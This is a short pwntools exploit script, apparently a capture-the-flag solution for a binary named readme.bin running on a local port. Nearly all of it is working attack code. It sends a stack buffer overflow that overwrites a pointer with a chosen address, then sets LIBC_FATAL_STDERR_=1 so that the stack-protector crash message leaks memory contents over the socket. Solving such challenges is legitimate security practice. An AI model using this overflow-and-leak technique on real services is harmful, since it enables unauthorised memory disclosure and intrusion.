#!/usr/bin/env python

from pwn import *

io = remote("127.0.0.1", 10001)
#io = process('./readme.bin')
#context.log_level = 'debug'

payload_1 = "A"*0x218 + p64(0x400d20) + p64(0) + p64(0x600d20)
io.sendline(payload_1)

payload_2 = "LIBC_FATAL_STDERR_=1"
io.sendline(payload_2)

print io.recvall()
